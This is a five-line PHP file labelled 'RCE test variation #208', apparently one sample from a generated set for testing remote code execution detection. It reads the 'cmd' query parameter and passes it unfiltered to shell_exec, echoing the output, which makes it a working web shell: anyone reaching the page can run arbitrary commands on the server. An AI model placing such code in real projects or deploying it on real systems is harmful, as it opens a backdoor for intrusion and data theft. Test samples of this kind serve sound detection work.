<?php
// RCE test variation #208
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>